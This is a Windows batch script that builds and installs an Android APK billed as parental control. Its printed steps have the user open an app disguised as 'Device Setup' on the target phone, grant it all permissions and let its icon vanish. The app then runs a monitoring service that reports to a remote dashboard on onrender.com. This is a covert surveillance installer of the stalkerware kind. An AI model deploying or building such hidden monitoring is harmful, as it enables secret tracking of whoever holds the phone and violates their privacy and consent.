@echo off
echo ========================================
echo  PARENTAL CONTROL - ONE-CLICK INSTALL
echo ========================================
echo.

echo Step 1: Building APK...
cd android
call gradlew.bat clean assembleDebug
cd ..
echo.

echo Step 2: Installing on device...
if exist "platform-tools\adb.exe" (
    platform-tools\adb.exe install android\app\build\outputs\apk\debug\app-debug.apk
) else (
    adb install android\app\build\outputs\apk\debug\app-debug.apk
)
echo.

if %ERRORLEVEL% == 0 (
    echo ========================================
    echo  INSTALLATION COMPLETE!
    echo ========================================
    echo.
    echo ON CHILD'S PHONE:
    echo 1. Open "Device Setup" app
    echo 2. Click "Activate Protection"
    echo 3. Grant all permissions
    echo 4. App icon will disappear
    echo.
    echo PARENT DASHBOARD:
    echo https://remote-monitor-ktm5.onrender.com
    echo.
    echo To check if working:
    if exist "platform-tools\adb.exe" (
        echo   platform-tools\adb.exe logcat ^| findstr MonitorService
    ) else (
        echo   adb logcat ^| findstr MonitorService
    )
    echo.
) else (
    echo ========================================
    echo  INSTALLATION FAILED - ADB NOT FOUND
    echo ========================================
    echo.
    echo Run this first: setup-adb.bat
    echo Then try again: INSTALL.bat
    echo.
)

pause
